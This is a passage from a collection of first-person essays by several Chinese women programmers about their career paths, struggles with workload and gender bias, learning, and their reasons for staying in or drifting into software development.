开始工作之后才发现了梦想和现实之间的差距。因为是外包公司，所以项目进度非常的紧，而且需求也是三天两头的变。我所在的项目组一共5个人，却有6个项目在同是开工，其中3个人事项目经理。不过那时候的我没想那么多，加班就加班呗，我觉得是自己学习的机会。因为我是项目组里唯一的女生，所以大家都非常的照顾我。在写代码的过程中有遇到什么问题，基本都会抽时间帮我解决。有时候我怕会打扰别人就到网上搜搜解决办法，看看文档。每次靠自己解决问题之后，都会很有满足感。我觉得我所有的代码知识几乎都来源于实践，有点现学现卖的。在工作了一年之后，我甚至觉得自己进步的很快。因为有同事跳槽的关系，项目组里缺人，我居然开始一个人负责一个项目。天啊，我觉得自己太伟大了！是个网上办事的电子平台的OA项目，还有一些杂七杂八的附带功能，视频、聊天、发短信什么……面向的客户是政府机构，使用的人员基本也都是事业单位或者是公务员。（这就不难理解为啥要那些杂七杂八的功能……）我接受这个项目的时候已经是中后期，从跟客户需求沟通，到代码，到测试，到现场实施，到后期维护……几乎就是我一个人在做。其中的苦辣酸甜也就不谈了，常常被客户骂的饭也吃不下。我就这么浑浑噩噩的又干了半年左右，每天都是白天接到客户的需求变更或者使用的bug（测试也是我自己做的……所以bug非常多）下午代码，晚上就跑到客户机房去调试补环境……
通过这样的长期反复，我开始思考自己一开始的初衷，我为什么要做程序员？我每天都要花很多的时间去理解和分析客户的需求，然后想尽办法修改我的代码，我的代码几经修改已经面目全非，已经没有任何代码质量和运行效率的考虑，纯粹只是为了实现功能而功能。由于工作时间的增加，我也看到了身边很多其他同事的工作状态，除了那些和我一样埋头苦干的所谓项目负责人外，其他的人都善于跟客户周旋，用一些看似很专业的辞藻去推脱用户提出的各种要求，实在推不了的，才勉为其难的答应下来。诚然，当公司把这个项目交给我的时候，我是充满热情的。但是现在，我终于清醒了。我想这不是我要的工作，我还只是一个刚刚毕业的本科生，不能夜郎自大的认为自己已经可以独挡一面。我根本不懂项目架构，不懂项目管理（虽然也木有人给我管理……），不懂得如何消化来自客户的需求并从中取舍（并不是客户所有的意见都要接受，这是我通过身体力行才了解到的……），我的能力仅仅停留在知其然而不知其所以然，我只能实现一个功能，但不知道怎样优化这个实现。所以我想，我应该去一个能教会我这些东西的地方2011年初的时候，我离开了原来的公司，到现在的公司上班。公司只有30多个人，研发部10人，测试部10人，剩下的有行政和销售。这是一家做产品的公司，产品主要涉及网络运维管理，安全策略啥的。公司非常注重产品质量，对于每次产品升级而变更的代码都会做code review，写的不好的地方就要改。也有详细的项目管理流程，项目经理会合理安排每一个时间节点的工作任务。在这样的环境下，对我的帮助是巨大的。
一切都要重头开始学，我第一次写python因为之前一直习惯的分号结果而郁闷不已，第一次用vi编辑代码，折腾了大半天才码出了一段代码，小心奕奕的保存好……现在回头想想都觉得很有意思我也想过今后要往什么方向发展，是一直做技术？还是做管理？做前期需求？以前总以为做IT，就是写代码。但当自己干了这些日子，才明白软件工程的每一个环节都是非常重要的，程序员只是其中的一个环节。但是无论今后自己要转什么方向，程序员的经验一定会为我在IT行业打下坚实的烙印。我坚信一个不会写代码的管理者，一定不是一个优秀的管理者。IT行业和别的行业很大的不同是人。IT都很喜欢分享，只要肯问或者寻求帮助，就算对方不是很懂，也会非常乐意帮助我解决。我觉得这样的氛围很好，互帮互助，共同进步。这个是我在别的行当很少看到的。我有很多同学都会跟我抱怨她们办公室里错综复杂的人际关系，每天听到那些事情，我都会庆幸自己从未遇到过。所以我想，我现在非常喜欢自己的职业，喜欢自己的行当，我就踏踏实实的做好我的工作。我就是一个简单的coder，每天写好每一行代码就好。至于今后的发展，今后的职业规划也不用想的太细。既然我要一直混迹于IT这个行业，那么多做几年程序员不也挺好。顶着程序员这个头衔，我就需要不断的学习，不断的接触新鲜的知识，让自己不会落后。
##### 禾禾木木 – 女程序员的路可以很长简要的说下自己，本科调档不幸进入计算机行业，于是开始了跟计算机，跟开发的纠结。本科在一个很差很封闭的学校，就死学了，只会考试，实践的东西基本没有~考研上 了一个挺好的学校，可是因为一些原因只读了个跟计算机相关的专业，自己接了几个活做学院网站什么的，网站虽然基本是自己前端后端一个人忙乎乎地整起来的， 但是质量很差，重复的代码很多，现在想想，太恐怖了，那时候就知道，功能实现就ok了。现在很后悔在学校的时候，在思维最活跃的时候没有错接触点新的东西。毕业。来上海，在一家外资民企工作至今。之前在学校里女生很好，特别计算机这块的，女孩子真的是宝，受着宠。工作了就不一样了。虽然男人帮们还是很帮助女孩子的，但是，毕竟工作是靠绩效靠能力来权衡的，尤其是技术领域。按照你完成的事情多少和能力强弱来决定关注度的，虽然大家感情都不错，但是我还是能明显地感觉出来，因为自己能力比同组的男同胞差，老大不太敢把重要的事情给我做，承担不了重要的事情，在关注度，升职加薪等 等上面就打了很多折扣。为什么会坚持下来呢？因为喜欢这个行业，也因为自己学的是这个，也因为自己小小的虚荣心，因为一般大家听说女程序员都觉得是很牛的，似乎女孩子加上了这个职业就有个光环在头上，只是我的一个想法，不知道大家有没有这么想过~还有，这个职业对我来说还是蛮有吸引力的，我也喜欢做这些事情，虽然进步不快，但是看着自己整出来的东西大家玩的开心，自己也很开心。
我虽然每天笑嘻嘻的，其实自己知道自己有多么辛苦。想写精致点的代码，重构，可是没有太多的时间，工作任务还是很重的，强度也大，基本上每个晚上到八九点走。要学习很多新的东西，我脑子还反应很慢，很多时候老大给同组的人讲的东西，可能大家马上就会了，可是我还是没听懂，老大会很无奈，我会记下来，有时间就去看。有时候会去关注下招聘的事情，不是为了跳槽，而是看看需要什么样的人，看到很多要求有开源代码经验的，在github上面整了代码的，我也会去关注，以后计划着自己整个人的网站，写技术文章，多交流。我还是很有热情和很负责的一个人，为了赶进度，周末两天都可以放工作进去，把上淘宝的时间都用来看新的东西了，逛街，基本一两个月去一次的。即便如此，老大从我们一个组走过，还是只会关心那些写代码写得好，事情做得好的人。虽然会很难过，但是我还是挺下来了。告诉自己说，既然坚持了这个行业，就开开心心地走下去，看看自己跟别人有什么不足，为什么会有差距，弥补弥补。这么坚持下来，虽然我还是没有同组的人进步快，但相比刚开始工作的时候，什么东西都不知道，还不知道该怎么去学，怎么去把程序写好，已经好了不知道多少倍。我也会去参加一些会议，去关注一些小组，在女孩子看韩剧的那些时间了，可能我关注的是一些技术的博客论坛等等，这么样，也增加了自己的见识等。我不敢说我现在是有多么强，至少，在我周围的认识的女孩子转行，退避的时候我坚持了下来，算是女孩子中不错的吧。
觉得女孩子跟男孩子差别并不大。可能他们真的思维会不一样，劳动强度能更承担些，但是，其他的应该都还好。我有个朋友，也是女孩子在做开发，长得很漂亮，她 说她经常碰到了问题，一大帮男的会过来帮忙，依赖心很强。我觉得依赖心强的女孩子做不好开发的，男孩子做得好开发，是因为他们喜欢自己专研，依赖别人了会 被人瞧不起，但是如果是女生，基本上还是有求必应的，所以，很多时候做不好，是因为自己还不在悬崖边，还有很多绳子牵着，虽然不至于让自己摔死，但是也被 绊住了，前进不了。还有，我自己的观察，长时间的专注和精益求精也是写好程序的关键。我自己最缺乏的就是长时间的专注，于是在找bug，看源码方面就欠缺 了很多，不能深入进去，要有在茫茫多的代码中调试的那种心境，一点点地挖掘到底是哪里出问题了，哪里影响效率了，哪里内存泄露了，一点点地试验等，能力就 提高了。精益求精才能写出好的代码出来，我也是受着周围男人帮的影响，从马大哈，从写完了程序就想玩想放手变成了事关审视代码，看哪里能够重构，哪里能够 抽象，去掉重复等，代码才能写得好。曾经一度，自己也很喜欢抱怨，抱怨自己怎么就没有别人进步那么快，就得不到重视，还这么辛苦，想走人，那段时间也就是我自己觉得最虚度，最没有成效的时间。现在想想，与其这样，还不如拿出时间来好好做好自己的事情，如果真的承受不下去了，觉得自己真的不适合做这个行业了，那么就转吧。我看到过一些女孩子，做程序做得很轻松，她们很聪慧，或者很有方法，我不是这种人，在这里我想鼓励那些不是 天才的女孩子们，如果你在做开发这个行业，如果你喜欢这个，那么坚持自己吧~
有人会说，做IT的女孩子，老得快。其实我觉得这说法也不全对。我周围也有些长得很漂亮，打扮得也很好，生活各方面都维持得很不错的女开发人员。很久以前看过有女孩子一边写着程序一边吃着芦荟啊，抹着各种护肤品，我们也可以做做瑜伽啊，平时煮点汤给自己补补脑子什么的，周末不宅着，去锻炼锻炼身体，虽然可能没那么多时间去逛街，但是也可以抽个空给自 己买些好看的衣服来让自己开心点。写程序的女孩子也是女孩子嘛。我没有讨论更多的技术方面的东西，我觉得工作态度，人生态度是很首要的。有个开心乐观的心境，加上好的方法和总结，我觉得，女孩子走程序员道路还是能走很长久的，也能做得很好。共勉。##### Bana – 我是一名女程序员 我无怨无悔我在大学学的是计算机与信息科学专业，那是大家有两个方向：计算机和数学。我想我以后肯定是不会从事计算机的，试想一个在电脑前面坐上一个小时就腰酸背痛的人&不能熬夜的人，会从事计算机方面的工作吗？现实与人所想差距是很大的。一晃，我已经在IT行业混了3年多了。现在除了不能熬夜，叫我在电脑前面坐上12个小时，一点问题也没有。大学我考研是考的数学方面的。那时很是迷茫，不知道自己能干什么，在大学我全身心的投入到那些毫无意义的课本知识上，最后获得的只是一叠毫无价值的证书。考研没有考上我报考的学校。调剂到了另外一所学校，我没有打算读，但是竟然跑出复试了。也许是为了给大学生活句号吧。
离校时间到了，我已经放弃了读研，而工作是没有着落的，我揣着优秀毕业生的证书被毕业了。毕业那一年的经历，对我打击很大。曾经的自信心，已经荡然无存。时至今日，才恢复得差不多了。2008年6月份，一个偶然的机会，让我走上了IT行业。在上海的一个朋友，他公司有人休产假要招人，他在他老大面前极力推荐我，结果就是他老大自掏腰包，出我往返的车费。当时我在湖北。当时的情况是：我只是在大三的时候考过一个程序员的东东，似乎在代码方面得分蛮高的（我记忆不好）。毕业设计的时候做了一个简单得不能再简单的发邮件的东东。我已经有一年没有碰任何跟代码有关的东西。就这样我从湖北跑去上海面试了。其实心里是没有底的，只是有一个强烈的愿望，一定要通过。我急需要改变目前的状况，这一次对于我意义重大。面试的时候，是朋友的老大和休产假的同事。也没有问什么，后来说叫我一个礼拜做一个用VB写的计算器。我应聘的工作是维护一个VB 6.0写的ERP系统。面试完后，我就赶紧整合多方资源来解决这个留给我的题目。从网上找相应的资料，寻找朋友的帮忙。回到湖北的时候，是表哥去接我的。我请的假比较长，就先去表哥那里啦。这时对于我来说，要紧要的事情就是完成那面试题目并Email出去。在坐了15个多小时的火车后（我坐的是硬座），一直到我把题目给解决后，一刻也不敢耽误。那时精神超好，后来题目解决后，我倒在床上就睡着了。把代码打包连带一篇非常诚恳的文字给面试的人发了过去，之后就焦急的等待结果。终于等来了电话，问我什么时候可以去上班，并说了薪水。当时我高兴坏了，辞了当时的工作，就奔赴上海了！
最开始的一个月，很难熬啊。我什么都不懂的。专程跑出上海书城买了一本VB 6.0的书来看。等到了我适应得差不多的时候，公司发生了一件事，要裁员了。金融危机呀，当时心惶惶啊，好害怕自己被Fire掉了。因为我这个岗位当时招了2个人，而且我总觉得我是多余的。最后的结局是：我被调出负责另外一个用ASP写的OA系统。之前负责的那人被Fire掉了。ASP，我不会。当初老大问的时候，我说应该还好，没有什么问题的。当初说好交接时间是一个月的，那人不同意，最后说是一个星期完成交接。结果是她最后上班的一个星期，她只来了两天。My God！那段时间是我最难熬的时候，User的电话打个不停，而我都不知道怎么解决，而且也找不到人帮忙。真是叫天天不灵，叫地地不应的。全靠自己一点一点的摸索。最终工作终于是游刃有余了。但是ASP我只是皮毛。我最初进公司的目的是想学C#，直到09年7月份的时候才接触到了C#。公司的系统要进行改版，用C#来编写。之前的老大因为一些原因，离开了。当时我差点流眼泪了，如果当初不是他，我还不知道自己会怎么样，会不会一生就那样了，就是痛苦的一生了。新来的经理，对于我产生了很大的影响。他给我们培训C#的相关知识，其实韩磊翻译的那本经典的C#书籍我都不知道翻了多少篇了，但是因为没有操作，了解到的很少。当经理给我们培训的时候，有一种豁然开朗的感觉，听起来特别带劲。经理给我们讲了程式命名的规范，SP命名的规范，自此我一直按照这些规范来规范着自己。接着就写了关于人事系统的几个窗体。看书和写代码完全是两回事。
新系统改版，我没有参与多少。能力不够的，在新系统上线（2010年10月份）的时候，了解了一些业务知识。当时心里很苦闷，我想做开发的，不想做维护的。维护做得没有意思，也学不到多少东西。而且要想学东西学得快的话，做开发是学得最快的。实际参与其中，才会去思考相应的解决方法。在寻找解决方法的过程中，就学到了东西。现有的工作岗位满足不了我的需求，但是此刻我又不能去找工作，因为我不自信。还是觉得自己什么都不会，其实也就是什么也不会。阅读是排遣痛苦最好的方法，我陆续的阅读了一些书籍。关于心理学方面的，在我认为，最重要的源头就是心理。找到了源头就好解决问题了。就这样，让我接触到了周金根的敏捷个人(有关敏捷个人的话题，需用另一篇日志来讲述)。2011年节后返回上海，当时上班没事看，我就看《遇见未知的自己》，因为我正面临着一个问题，不知道是怎么回事，就想从书里面寻找答案。谁知，看完不懂后，又跑出看了《秘密》。而敏捷练习也在进行着，在做个人生活方向盘的时候，我明白了什么对于我来说是最重要的。当下也就有了计划，准备换工作了。当对某事有着强烈的愿望时，那事一定会实现的。4月中旬，经理离职了，去武汉开公司。我就跟着经理回武汉了。这真是一个很好的机会，在武汉，我周末就可以回家。更重要的是，我做开发，做我喜欢做的事情。此时我已经找不到待在上海的意义了。家人和个人的前途对于我来说，是最重要的。
经理建议我们至少读三本英文原文书籍，这样之后就看英文就不会排斥了。为什么看书呢？你解决某个问题的时候，在网上找到的资料时很片面的。书里面的知识比较全面，但是需要花时间。还推荐了一些关注的英文网站。Code Project 是必备的。提高搜商是必须的，找准问题的关键点。坚持每天看书。关键是要多思考。充分的运用各种知识的能力。我意识到某个地方不足的时候，会找相应的书籍来充电。让我一段时间不看书，会浑身不舒服的。当然我看的书的范围很广泛的。从事这个行业，本来就不是那么轻松的事情。而我不喜欢轻松的工作。这个行业不断的出现新的知识，需要不停的学习。其实不管哪个行业，都需要不停的学习，否则很快被淘汰的。爸妈曾经说过，如果我当初去读研，毕业后去学校教书就好了，工作稳定。未来的事情谁说得到呢。我不喜欢当老师，而且在这个变化莫测的社会，又有什么是稳定的呢？同学、朋友跟我讲，女孩子干这行太辛苦了，转行吧。可是我能够体会到乐趣所在。为自己写出了一段好的代码，或者是解决了某个困难的问题。这个行业要加班，熬夜，那么为什么不能从别的角度来看这个问题呢？提高自己的工作效率，管理好自己，是不是可以解决这个问题呢。这一年，我一直在修生养性，读灵修方面的书籍。人管理好自己后，其他的是不是就不是问题！
从事这个行业，我无怨无悔。现在我还是菜鸟，需要学习的东西很多。未来的路还很长，我坚信我会走好的。##### Cathy – 一个非典型的女程序员的曲折经历简单介绍一下我自己吧，我07年从一所TOP10的著名理工大学计算机专业硕士毕业，目前在一间世界500强的欧美通信公司担任高级系统软件工程师的职位。因为本科并不是学的传统计算机专业，而是计算机与通信的交叉学科（课程设置上少了面向对象、JAVA程序设计等计算机高级专业课程，增加了很多电子线路设计、通信、信号论等）。毕业时因为专业课成绩优异直接保研。如果说本科毕业的时候，自己还是颇为踌躇满志，那研究生的三年就是郁闷的开始。保研后，虽然还在计算机专业但主要从事的是硬件电路板的开发。项目组的组长是一个博士，人很好但是不太会和女孩子打交道，或者说有一些性别歧视吧。进入项目组之后，一开始做了一些电路板的Schematics、PCB layout和Debug的工作，也得到了组长的好评。但是渐渐的，由于我并没有表现得非常的积极主动和对技术充满热情，组长分给我的任务越来越少。我也越来越苦闷，当时的我还并不知道该如何面对这种情况。组里曾经也来过一个女生，面临比我还要糟糕的情况，记得一次项目组吃饭当时那个女生没来，组长直接对我们大家说这个女生能力不行，没过多久她就被调去别的组了。但是我还留在这里，组长几乎很少和我说话，当时的我不知道如何向他表达我的心情也不知道自己想要什么，陷入对自己能力的深深的否定中，当时的想法只有一个：赶快毕业吧。这种情况一直持续到研二下学期。最后一年碰到了一个去国外实习半年的机会，毫不犹豫的就去了，是在一个很牛的电子公司里做电子工程师助理。干的活基本和在项目组干的差不多，画图调板子打杂，但是这半年我想清楚了一件事，就是我对干硬件没啥兴趣如果不能做IC design的话就转去做软件吧！
但是，当时的我还陷入在对自己能力的盲目乐观中，总觉得自己之前成绩很好，做实验写程序从来不输给男生，想转应该不难吧。回国后迅速搞定论文就开始找工作了。找工作的时候，现实很快无情地把我打倒了。因为当时我的男朋友也是现在的老公已经早我几年毕业在北京工作了，而且发展得很不错，所以当时我也一心只想找北京的工作。可是自己过去三年几乎没有写过程序，和学校里众多写过N年程序的同学竞争，结果可想而知。我只能拿到去其他城市做硬件的offer，但是却无法拿到去北京做软件的offer。这时，我的自信心跌到了谷底，TOP10大学的TOP10学生（即使读研期间很郁闷但是还是拿了不少奖学金，而且去国外半年也赚了不少钱）居然找不到工作。后来，在一个师兄的推荐下，得到了我的第一份工作，在北京的一个小公司做嵌入式软件开发。虽然能来北京做软件，但和我去Google、Microsoft、IBM的同学相比，失落感不言而喻。几乎每个认识的人都会问我为什么去那个公司，为什么不去大外企，为什么不留在国外。这种失落情绪笼罩了我工作的第一年。但是还好，这个公司没什么牛人，并且因为我很好的学习能力，很快上手了。因为做底层软件需要对各种硬件接口、中断、DMA、处理器深入理解，我之前做硬件的经验也派上了用场，只用了半年时间，我就开始独立负责项目了。从第二年开始，我开始参与公司一些重要产品的开发，越来越得心应手。
期间，公司从其他部门调了一个工作多年的男程序员来做我的领导。一开始，我很高兴，因为了解到这个人技术不错，而且一直做上层软件所以对面向对象、设计模式、软件架构、代码规范都颇有经验，我正好可以向他学习。但是，一起工作了一段时间后，矛盾出现了。这个人认为我虽然学东西很快对公司产品业务熟悉，但是对技术缺乏热情很少主动学习技术，对很多软件开发的基础也掌握得不够，所以每次对我的评估结果就是一般；而我当时初出茅庐，认为这个人对硬件毫无了解并且没有很快在做底层软件上证明自己比我牛，所以很不服气。记得当时一起开发一个产品，因为我对主要的业务逻辑更熟悉，所以挑了最复杂的业务逻辑模块来做；他则负责其他几个通用模块的开发。为了证明自己，我只用了他一半的时间就完成了所有功能。在联调测试过程中，由于他是项目的负责人，所以每次Bug都是先提交到他那里然后再由他来指派给对应的人来负责。因为他对平台不熟悉，所以每次解Bug都要连调试器跟很久，而我常常只通过代码Review就能找出问题所在。渐渐的，所有测试的问题都直接反馈到我这边；后来产品上市，售后碰到解决不了的问题也会直接反馈到我这里。等到我们一起开发第二个产品的时候，那个男程序员几乎完全交由我独立负责。半年后，他调回了他之前的部门，我们共同开发的两个产品也顺理成章由我独立负责下去。
在公司工作三年以后，我对继续呆在这个部门里干软件开发渐渐失去了兴趣，基本都是重复性的劳动，而且由于是小公司除了开发之外还有很多杂事（比如因为公司售前售后没有技术背景，常常需要开发去Support；因为薪资不高常常会招一些水平较低的工程师，需要很多力气去Training）软件水平也难以再提高。而这时，公司也有意让我转向业务型负责人的方向，这几乎是在当时公司晋升的唯一途径；而如果升职，之后基本和程序员Say Bye了。可是真的要放弃做开发吗？以当时所在行业规模和公司本身的名气地位来说，如果不做开发，我很难想象以后跳槽的机会在哪儿；如果做开发，我又很难在公司继续获得我想要的。于是，我接受了公司的安排，去体验一下程序员之外的工作是否适合，同时也积极寻求跳槽的机会。在公司的最后半年，我几乎脱离了开发的工作，主要的工作内容是调研公司计划新开辟的产品线的产品形态及技术，去往各地出差做客户交流，和开发部门开会制定产品开发计划。在这半年里，我开始怀念单纯的程序员生活，不用去应酬形形色色的陌生人，即使公司倒闭也能很快找到工作养家糊口的踏实感。第二次找工作的经历和第一次完全不同，有了之前几年的工作经验，我很快就拿到了几个大公司的offer。通过面试，我也逐渐认清了自己的不足之处。回想起来，我觉得之前那个男程序员说的一点没错。我并不是个本身对技术非常有热情的人，之前的研究生经历也是如此，后来工作也常常认为自己学东西快所以技术可以等到用的时候再学。面试的时候和一些经验丰富的面试官交流，可以非常明显得感受到热情这个东西对技术水平有着多么重要的影响。但是，另一方面，我对技术也并不是完全没有热情，这种热情很大程度受外界环境的影响。如果在一个大家都很牛都很积极学技术的环境，我也非常乐在其中。选择目前的公司，一是因为当时经历了比较艰苦的几轮技术面试，另一个重要的因素就是这里是有可以正面影响我的环境。目前在现在的公司工作了大半年，虽然部门三十多个程序员就我一个女孩（但是很多男程序员级别都比我低，哈哈）但是很开心，周围都是聪明并且富有经验的同事，让我受益很多，对技术也越来越有兴趣。
这就是我有点曲折的女程序员经历，但也是女程序员们很有可能会碰到的情况，譬如性别歧视，譬如对技术的热情等等。我觉得做女程序员不容易，女程序员由于女性的心理特质容易把负面的情绪扩大。所以女程序员最重要的是内心强大，碰到不信任你的领导或男同事，要大胆说出自己的想法，同时拿出有说服力的行动。另外，从我自己的经历和我面试过的女程序员来看，女孩通常会专注于完成工作，不像男孩那么对技术有热情；而且社会上也有各种声音说女孩不适合做程序员，于是女孩也容易自我怀疑。我的经验是，有时候先暂时不要想究竟适不适合，努力做一段时间，有些事情需要深入到一定程度才会有兴趣，如果还是不喜欢再考虑是不是放弃。##### Linn – 误打误撞的程序员昨天老公发来的网址给我看。   那时候刚好项目上线，大家要去聚餐，就匆忙的瞅了一眼，跟老公开玩笑说，怎么样，我也写一篇？   他说好啊。今天是2011年的最后一天。   挺有纪念意义的，回顾一下。我是高中生，05年毕业，去了北大青鸟，我知道现在很多人对北大青鸟的看法褒贬不一。   怎么说呢，一母生九子吧。其实当初高考失败，我不想去上大专，更不想复习，我知道自己学不进去。   那时候接触电脑不多，可能也就一周一次的电脑上机课，但我就是对它很有兴趣。很单纯的。
接着，同学听别人说了北大青鸟，然后想让我跟她一起去。   其实，当时我连编程是干什么的都不知道。哈哈。   我那个同学也是女的。   我说服不了我爸爸，我爸爸还是比较想让我上大专，他说至少你出去长长见识。   我脾气比较倔，想一件事，就一定要去做，我带我同学去我家，她的劝说能力比较强，最后我爸无奈之下同意了。然后我就离开了我们县，去了我们省的省会。第一次出远门。   我当时不会讲普通话，我觉得自卑（现在想想我真是很容易自卑），到了那里后，同学跟她姐姐有事出去了几天。   那几天我就跟个傻子一样，就在她姐姐租来的小屋子里呆着，没有电视，没有电脑，甚至我不怎么出去吃饭。   寂寞、孤独、无助、茫然。   其实人的恐惧源于无知。对这个城市的无知，对未来生活的无知。我终于没有忍住，给家里打了个电话，哭了。   我爸跟同学的爸爸听说后，立马就坐车到了我住的地方，我那时候真的没有想到有那么严重的结果。   我爸爸一直都比较宠我，我没想到他们会来。   那天我刚好跟同学还有她姐姐出去玩，很晚才回来。   那是夏天，很热，就看到两个老人满头大汗的在我们住的屋子对门那家，吃西瓜。   我差点又哭了。   第二天早上，我爸问我，他说，你还想留下吗。   我说想。   就这么回去了，我觉得没脸。
我想那时候我爸就彻底死了劝我回去的心了吧。然后交钱上课。大家刚学编程的时候可能都会有那样的经历，计算机本来就是一个很抽象的东西，编程，就是抽象中的抽象。   刚上课的时候，很久没有玩过电脑，我甚至忘记了本来就不怎么熟悉的盲打。   我很清楚的记得班主任跟我说：盲打还不会，基础不行啊，多练习练习。2005年8月份，到2007年3月份，我毕业了。这时候我的状态：学过多门编程语言，主打java，当初学了app4.0，4.0的课程里有struts1.2，oracle等。   但，知其然不知其所以然，还是懵懵懂懂的样子。其实我们当时有两个就业方向.NET，J2EE，当时还是叫J2EE的。   都说J2EE是比较难的，我为什么学这个，说起来也有点搞笑，因为我觉得，.NET可视化功能太强大了。   我本来就学的懵懂，不精，控件拖来拖去的，我就更迷糊了。不如JAVA一行行代码写起来来的踏实，哈哈。第一次面试，现在说起来真的很鄙视当时的自己。   我本来是相当老实一孩子。   我们当时有就业部，负责学生就业。   教我们如何面试，如果跟面试官交流，如何突出自己的优点。   我记得特清楚的是，如果人家问你的缺点，你可不能真说你自己的缺点，要说一种看起来像缺点，实际对编程或者公司来说是优点的。   我真是傻孩子，我这么干了，记不太清我的原话了，但大意说自己比较执着什么的。   面试官最后说了一句话让我无地自容至今，他说：这不还是你优点吗？
07年4月9号入职。公司做一个门户网站。公司给新员工机会，试用三天。   就是看公司原有的框架spring+ibatis，做一个功能给pm看，如果可以，就留下。   我运气有点背，机器有问题，不时的挂。   再说我也没怎么看懂的说，三天过去以后，没能拿出来一个东西。   pm过来看了一下，然后跟人事说，回来的时候表达要我离开的意思。   当时我内向啊，有点懵。   我跟他说，我机器有问题。   pm人也很好，他说那再给你半天吧。   这时，我后来的组长，真的给我很大的帮助，他说你应该怎么怎么来。   其实我本来有些懂的，他那么一说，我顿悟了。   1个小时，或许不到，反正很短，我又叫pm过来看。   他跟我说，好了，你可以留下了。   我跑到卫生间，那瞬间，真的很想大哭。兴奋、激动、委屈。我也读不懂当时的那种感情。其实这个公司并没有让我的技术提高多少。   pm是一个技术相当强悍的人，至今见过这么多人，我依旧这么觉得。   框架里的很多东西，当时不太能理解的了。   但是当初经历的那群人，真的让我铭记至今。09年，男朋友毕业，留在了另外一个城市，我所在的公司宣布解散，于是我也过去了。其实我觉得我内心深处有一股非常强烈的自卑，我不知道这自卑来自于过度的谦虚，还是觉得自己的水平真的不行。我想或许两者兼有。
在这个城市的面试很糟糕，我是一个很简单的人，只是想尽自己的努力去做一些事情。   后来留在了一家公司，公司新开的一个部门。   招的都是几个大学刚毕业的学生，有几个从达内出来的。   他们的技术不是不怎么样，是真的很不行！   于是我跟另外一个男同事就成了头儿。那时候的项目是给公司自己用，做页面，写css，写代码，服务器，几乎都是我来牵头。   那一年的时间，对我的感触很大，技术也提高很多，因为什么事情都是你自己来做，自己去想。   压力很大，但也很茫然。我不知道自己在做些什么。因为公司毕竟不是正规的it公司，我自认自己技术挺烂，真的需要人协助。说一下我的男朋友。   他一直喜欢手机上的东西，知识面覆盖非常广。   10年6月份的时候，北京有一个机会，他过来面试，然后留下做iphone手机开发了。   于是我也着手辞职跟着过来。北京的面试依旧不怎么乐观。于是我几乎每天晚上看基础知识看到很晚。   我一个同事说的好。他说如果你不能说，你就只能靠做面试题来让对方看到你的水平。我还是算运气比较好，一个星期的时间，我收到了现在公司的offer。或许你看到这里已经明白，我几乎是跟着男朋友的脚步走。   事实上，是这样的。   做程序员，只是我要做的一件事。而家庭是我的全部。   事业上，我其实一直都很茫然。   我想是有这样一部分的人存在，他们没有梦想，没有目标。   我说的梦想是指那种真心喜欢，并能为之奋斗一生的事情。   我想我就是那样的人。   但这种人必然有另外一种追逐的东西，比如，我时刻都很清楚家庭才是我的全部。   我会找一份不很累的工作，有充裕的时间，来陪伴他们，同时也让自己有事情做，不空虚，不无聊，不虚度。   但这不代表我工作会做的很糟糕，相反，我第一个项目经理跟我说，以后如果我开了公司，我第一个就会找你。   我第二家公司的老板，在我来北京之后还打电话叫我回去。   现在的公司，领导跟我说，我见过很多跟你一样条件，从北大青鸟出来的人，但像你这样的，真的少见。
我做程序员，其实算误打误撞，现在想想，我当时向往的应该是美工设计之类的工作。   我不是什么技术大牛，我碰到的女程序员，也没有什么技术大牛的。   但是他们都有一个共同点，就是不管他们做任何东西，只要交到他们手上，在相等条件下都会比男同事做的好。   这可能跟女孩子天生的认真细心有关。这篇文章，可能看起来比较乱。   但我想表达的一个意思就是，其实女程序员很普通，也特别，神秘，也不神秘，如果你了解了的话。   但她们绝对是可爱的。大多数有着男孩子的性格，豪爽。   所以我时常说这世界上有男人、女人、女博士、女程序员，哈哈。##### Nana – 做喜欢做的事，所以很开心你好，关于女程序员的那篇blog是群里一个GG推荐我看的。这应该算一个励志故事吧，可是一般励志故事都没什么意思，不是苦大深仇，就是从委屈一路走到故事末尾，见到一点小小的胜利。说的故事虽然到了末尾，但人还活着啊，所以真正的故事还没完呢。对励志剧不太感兴趣，因为事实往往是，努力不一定会成功，而且不成功的在大多数。我的故事无关成功与失败，随便看看。先说说为什么会去写程序这件事吧。起初完全不相关的，我喜欢的是动漫。但是对于自己的画画和分镜都不看好，于是想到了游戏。动漫游，是不分家的。游戏行业有许多种职业，常见的小工有：策划美术程序。这3种职业的相关基础课都上了下，其中，编程给我留下了非同寻常的印象：这件事情，太TM好玩了！！即便会拉3D模型、会设计游戏的灵魂世界观，也不能同它相比。于是，几乎没怎么犹豫就开始学习编程了。
一开始是学java，比较容易的。后来接触了C++，貌似稍微复杂点，不过总的来说，会了一门语言其它的都有点异曲同工，所以不管性别如何，其实没啥差别。在工作中，也没觉得人家拿我性别说事或特殊化，大家都凭能力干活拿薪水，可能比某些靠关系的行业好一点。很想推荐下我们项目组正在开发的这个游戏，但又怕一说名字就暴露了，呵呵，我们组就我一个mm。人家都说，编程薪水高，我不能说这是假的，但我的同学中，薪水高的都是加班连轴转、除了程序不太想其它的。用那样的精力时间换来的高薪，到哪个行业都能换到吧。学历，貌似在编程这个行业里更加渺小了吧。只有一次去面试一家大游戏公司时，被问过是不是重点大学。其它公司基本不怎么关心，更看重能力。也只有一次，在面试中，被问到是否已婚。可能是怕生孩子耽误工作吧，人走了活儿给其他人干，其他人虽然不说什么，但无形中增加的压力是肯定有的。但在这里我要说一句，这些面试官思维都有点传统啊，其实不结婚也可以生孩子、已婚生完孩子的也可以再生啊。要不你们干脆就说，女性勿面试，不是更好？！做程序是吃青春饭，这话有点道理的。我现在的工作，是喜欢干的事，所以很开心。但如果是一个需要养家糊口的GG，可能就不能只顾着自己开心了。所以说，做程序员，mm也许更合适？
